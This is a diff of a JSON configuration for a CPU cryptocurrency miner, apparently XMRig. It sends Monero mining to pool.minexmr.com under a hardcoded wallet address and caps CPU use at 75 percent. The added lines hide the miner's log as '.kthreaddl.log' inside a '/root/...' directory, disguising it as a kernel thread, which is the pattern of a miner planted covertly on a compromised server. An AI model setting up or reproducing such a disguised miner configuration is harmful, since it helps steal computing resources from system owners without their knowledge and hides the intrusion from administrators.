@@ -1,32 +1,25 @@
 {
     "autosave": true,
     "cpu": {
-        "enabled": true,
-        "huge-pages": true,
-        "huge-pages-jit": false,
-        "hw-aes": null,
-        "priority": null,
-        "memory-pool": true,
-        "yield": true,
-        "max-threads-hint": 75,
-        "max-cpu-usage":75,
-        "asm": true,
-        "argon2-impl": null,
-        "astrobwt-max-size": 550,
-        "astrobwt-avx2": false,
-        "cn/0": false,
-        "cn-lite/0": false
-    },
+		"enable":true,
+		"huge-pages": true,
+		"max-cpu-usage":75,
+		"max-threads-hint": 75,
+	},
     "opencl": false,
     "cuda": false,
+	"log-file": "/root/.../.kthreaddl.log",
+	"syslog": true,
+	"donate-level":1,
+	"background": false,
     "pools": [
         {
             "url": "pool.minexmr.com:443",
             "user": "4B4qdh346S9MTs9o8n8kRWRNgrXJktcAcKdq8qvjaevKEtXMSCFuKvD74UZbuT9ndsN1x8LcQzmk6HvySw2NxvUrDqSaU99",
             "keepalive": true,
             "tls": true,
-            "rig-id": "*",
-            "pass": "*"
+			"pass": "*",
+			"rig-id": null
         }
     ]
 }
